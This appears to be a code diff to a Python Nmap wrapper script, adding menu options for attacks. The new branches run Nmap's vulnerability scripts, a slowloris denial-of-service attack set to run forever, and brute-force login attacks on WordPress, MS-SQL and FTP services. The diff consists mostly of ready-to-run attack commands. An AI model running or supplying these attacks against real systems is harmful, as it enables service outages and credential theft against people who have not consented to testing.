@@ -16,10 +16,15 @@ res = input(
     \nPlease enter the type of scan you want to run:
     1. SYN ACK Scan
     2. UDP Scan
-    3. Comprehensive Scan\n
+    3. Comprehensive Scan
+    4. CVE detection
+    5. DOS
+    6. Wordpress brute force attack
+    7. MS-SQL brute force attack
+    8. FTP brute force attack\n
     """
 )
-print("You have selected the option: " + res)
+print("\nYou have selected the option: " + res)
 
 if res == '1':
     print('Nmap Version: ', scanner.nmap_version())
@@ -43,6 +48,36 @@ elif res == '3':
     print("OS: ", scanner[ip_addr]['osmatch'][0]['osclass'][0]['osfamily'], scanner[ip_addr]['osmatch'][0]['osclass'][0]['vendor'])
     print(scanner[ip_addr].all_protocols())
     print('Open ports: ', scanner[ip_addr]['tcp'].keys())
+elif res == '4':
+    print('Nmap Version: ', scanner.nmap_version())
+    scanner.scan(ip_addr, ports, '-Pn --script vuln')
+    print(scanner.scaninfo())
+    print(scanner._scan_result)
+    print("IP Status: ", scanner[ip_addr].state())
+elif res == '5':
+    print('Nmap Version: ', scanner.nmap_version())
+    scanner.scan(ip_addr, ports, '-max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true')
+    print(scanner.scaninfo())
+    print(scanner._scan_result)
+    print("IP Status: ", scanner[ip_addr].state())
+elif res == '6':
+    print('Nmap Version: ', scanner.nmap_version())
+    scanner.scan(ip_addr, ports, "-sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true'")
+    print(scanner.scaninfo())
+    print(scanner._scan_result)
+    print("IP Status: ", scanner[ip_addr].state())
+elif res == '7':
+    print('Nmap Version: ', scanner.nmap_version())
+    scanner.scan(ip_addr, '1433', "--script ms-sql-brute --script-args 'userdb=customuser.txt,passdb=custompass.txt'")
+    print(scanner.scaninfo())
+    print(scanner._scan_result)
+    print("IP Status: ", scanner[ip_addr].state())
+elif res == '8':
+    print('Nmap Version: ', scanner.nmap_version())
+    scanner.scan(ip_addr, '21', "--script ftp-brute")
+    print(scanner.scaninfo())
+    print(scanner._scan_result)
+    print("IP Status: ", scanner[ip_addr].state())
 else:
     print('Please enter a valid option.')
     exit()
